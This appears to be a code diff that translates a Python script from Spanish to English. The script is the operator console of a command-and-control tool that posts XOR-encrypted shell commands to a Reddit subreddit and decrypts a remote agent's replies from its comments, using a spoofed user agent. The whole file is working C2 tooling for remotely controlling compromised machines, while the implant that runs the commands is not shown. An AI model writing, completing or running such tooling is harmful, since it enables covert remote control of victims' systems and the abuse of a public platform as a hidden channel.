@@ -6,13 +6,12 @@ import string
 import re
 import base64
 
-
-# CONFIGURACIÓN
+# CONFIGURATION
 SUBREDDIT_NAME = ""
-USUARIO_BOT = ""
-CLAVE_XOR = ""
+BOT_USERNAME = ""
+XOR_KEY = ""
 
-# Configura tus credenciales de Reddit
+# Set your Reddit credentials
 reddit = praw.Reddit(
     client_id='',
     client_secret='',
@@ -21,73 +20,70 @@ reddit = praw.Reddit(
     user_agent='X-Test-Script'
 )
 
-
-def generar_user_agent():
-    plataformas = [
+def generate_user_agent():
+    platforms = [
         "Windows NT 10.0; Win64; x64",
         "X11; Linux x86_64",
         "Macintosh; Intel Mac OS X 10_15_7"
     ]
-    navegador = random.choice(["Firefox", "Chrome", "Edge"])
-    plataforma = random.choice(plataformas)
+    browser = random.choice(["Firefox", "Chrome", "Edge"])
+    platform = random.choice(platforms)
     build = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-    return f"Mozilla/5.0 ({plataforma}) {navegador}/{build} RedditShellBot"
+    return f"Mozilla/5.0 ({platform}) {browser}/{build} RedditShellBot"
 
-def xor_cipher(data: str, key: str = CLAVE_XOR, modo="cifrar") -> str:
-    if modo == "cifrar":
+def xor_cipher(data: str, key: str = XOR_KEY, mode="encrypt") -> str:
+    if mode == "encrypt":
         raw = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
         return base64.b64encode(raw.encode()).decode()
-    elif modo == "descifrar":
+    elif mode == "decrypt":
         raw = base64.b64decode(data.encode()).decode()
         return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(raw))
 
-
-
-def enviar_comando(comando):
-    cifrado = xor_cipher(comando, modo="cifrar")
+def send_command(command):
+    encrypted = xor_cipher(command, mode="encrypt")
     subreddit = reddit.subreddit(SUBREDDIT_NAME)
-    post = subreddit.submit(title=cifrado, selftext='')
-    print(f"\n[+] Comando cifrado enviado")
-    print(f"    Esperando respuesta en: https://www.reddit.com{post.permalink}")
+    post = subreddit.submit(title=encrypted, selftext='')
+    print(f"\n[+] Encrypted command sent")
+    print(f"    Waiting for response at: https://www.reddit.com{post.permalink}")
     return post
 
-def limpiar_respuesta(mensaje: str):
-    return re.sub(r"<!--sep-\d+-->", "", mensaje).strip()
+def clean_response(message: str):
+    return re.sub(r"<!--sep-\d+-->", "", message).strip()
 
-def esperar_respuesta(post, timeout=180):
+def wait_for_response(post, timeout=180):
     start_time = time.time()
     while time.time() - start_time < timeout:
-        post = reddit.submission(id=post.id)  # Recarga forzada
+        post = reddit.submission(id=post.id)  # Force reload
         post.comments.replace_more(limit=0)
         for comment in post.comments:
-            print(f"[DEBUG] Visto comentario de {comment.author.name}")
-            if comment.author.name == USUARIO_BOT:
-                cuerpo_limpio = limpiar_respuesta(comment.body)
-                return xor_cipher(cuerpo_limpio, modo="descifrar")
-        print("[...] Esperando respuesta del agente...")
+            print(f"[DEBUG] Seen comment from {comment.author.name}")
+            if comment.author.name == BOT_USERNAME:
+                cleaned_body = clean_response(comment.body)
+                return xor_cipher(cleaned_body, mode="decrypt")
+        print("[...] Waiting for agent response...")
         time.sleep(5)
-    return "[TIMEOUT] No se recibió respuesta del bot."
+    return "[TIMEOUT] No response received from the bot."
 
 def shell():
     print(f"=== Reddit C2 Shell (subreddit: r/{SUBREDDIT_NAME}) ===")
-    print("Escribe un comando o 'exit' para salir.\n")
+    print("Type a command or 'exit' to quit.\n")
 
     while True:
         try:
-            comando = input("> ").strip()
-            if comando.lower() in ["exit", "quit"]:
+            command = input("> ").strip()
+            if command.lower() in ["exit", "quit"]:
                 break
-            if not comando:
+            if not command:
                 continue
 
-            post = enviar_comando(comando)
-            respuesta = esperar_respuesta(post)
-            print("\n[Respuesta del bot descifrada]\n")
-            print(respuesta)
-            print("\n--- Comando completado ---\n")
+            post = send_command(command)
+            response = wait_for_response(post)
+            print("\n[Decrypted bot response]\n")
+            print(response)
+            print("\n--- Command completed ---\n")
 
         except KeyboardInterrupt:
-            print("\n[!] Saliendo.")
+            print("\n[!] Exiting.")
             break
         except Exception as e:
             print(f"[ERROR] {e}")
